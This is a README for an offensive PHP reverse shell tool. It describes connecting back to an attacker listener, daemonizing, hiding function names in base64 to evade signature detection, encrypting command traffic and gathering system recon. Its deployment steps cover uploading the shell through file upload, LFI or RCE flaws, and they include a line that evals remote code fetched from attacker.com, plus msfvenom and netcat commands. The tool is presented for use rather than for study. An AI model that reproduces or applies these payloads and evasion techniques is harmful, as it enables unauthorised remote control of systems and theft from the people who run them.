# Advanced & Modernized PHP Reverse Shell

A lightweight, configurable reverse shell implementation in PHP designed for post-exploitation scenarios. This script establishes a reverse connection from a compromised target to an attacker-controlled listener, enabling remote command execution with optional encryption and stealth features.

## Features

- **Reverse TCP Connection**: Connects back to a specified IP and port.
- **Encryption Support**: AES-256-GCM encryption using OpenSSL (disabled automatically if extension is missing).
- **Stealth Enhancements**:
  - Daemonizes the process (via `pcntl_fork` and `posix_setsid`).
  - Obfuscated internal function calls using base64-encoded names.
- **Metasploit Compatibility**: Optional mode to receive and execute a Metasploit second-stage payload.
- **System Recon**: Automatically gathers and sends basic system information upon connection.
- **Cross-Platform**: Uses adaptive commands for network interface enumeration (`ifconfig` or `ip a`).

## Configuration

Edit the following variables at the top of the script:

```php
private $__ip = '{RHOST}';              // Attacker's IP address
private $__port = {RPORT};              // Listener port
private $__shell_cmd = 'L2Jpbi9zaCAtaQ=='; // Base64 of '/bin/sh -i'
private $__use_encryption = true;       // Enable or disable AES encryption
private $__metasploit_mode = false;     // Set to true when using msfvenom payloads
private $__gather_info = true;          // Whether to send initial system info
```

> Ensure your encryption key in the constructor is exactly 32 bytes:
> ```php
> public function __construct($encryption_key = 'your_super_secret_32_byte_key!!') {
> ```

## Usage

### 1. Start a Listener

#### For standard shell (Netcat style):
```bash
nc -lvnp 4444
```

#### For encrypted shells:
Use a custom decrypting listener or modify this script to log decrypted output during testing.

> Example Python decrypting listener available upon request (ensure matching AES-GCM settings).

### 2. Deploy the Payload

Upload and execute on the target via vulnerable parameter (e.g., file upload, LFI, RCE):

```bash
curl http://target.com/shell.php
```

Alternatively, include inline in exploit:
```php
<?php eval(file_get_contents('http://attacker.com/reverse_shell.php')); ?>
```

### 3. Interact

Once connected, you'll receive an interactive shell prompt (or Metasploit session if `__metasploit_mode = true`.

## Metasploit Integration

To use with `msfvenom`:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php
```

Then set:
```php
private $__metasploit_mode = true;
```

And trigger the script — it will automatically read the stage length prefix and execute the Meterpreter payload in memory.

## Detection & Evasion

- Function names are stored as base64 to evade basic signature detection.
- Uses `@` error suppression for anti-debugging.
- Forks into background by default.
- No reliance on `exec()`, `system()`, etc. — uses `proc_open()` for better control.

**Note:** Advanced defenses (e.g., EDR, PHP hooks, logging) may still detect this activity.

---

## Cleanup

The script performs cleanup on exit:
- Closes all pipes and socket.
- Terminates subprocess cleanly.
- Daemonized children do not leave traces on parent.
